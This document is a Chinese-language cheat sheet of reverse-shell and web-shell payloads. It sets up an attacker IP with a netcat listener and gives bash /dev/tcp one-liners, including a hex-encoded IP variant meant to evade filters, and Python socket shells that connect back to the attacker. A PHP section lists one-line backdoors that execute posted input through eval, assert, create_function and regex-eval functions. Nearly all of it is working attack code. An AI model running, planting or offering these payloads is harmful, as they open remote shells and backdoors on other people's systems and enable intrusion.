# 反弹 shell

> 主机 IP: 192.168.8.8
> 靶机 IP: 192.168.8.9

- 主机: `nc -lvvp 2333`

## bash

```bash
# 40个字符
bash -i >& /dev/tcp/192.168.8.8/2333 0>&1

bash -c "bash -i >& /dev/tcp/192.168.8.8/2333 0>&1"

# 十六进制绕过
bash -i >& /dev/tcp/0xc0.0xa8.0x08.0x08/2333 0>&1

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.8.8",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

## php

```php
// php一句话木马

<?php @eval($_POST['x']) ?>
<?php @assert($_POST['x']) ?>

// php5 php7
<?php $st=@create_function('',$_POST['x']);$st();?>

// php5
<?php @preg_replace('/.*/e',$_POST['x'],'');?>
<?php @preg_filter('/.*/e',$_POST['x'],'');?>

// php7
<?php @mb_ereg_replace('.*',$_POST['x'],'','ee');?>
<?php @mb_eregi_replace('.*',$_POST['x'],'','ee');?>
<?php @mbereg_replace('.*',$_POST['x'],'','ee');?>
<?php @mberegi_replace('.*',$_POST['x'],'','ee');?>
```

## python

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.8.8",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
```

```python
import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.8.8", 2333))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(["/bin/bash", "-i"])
```
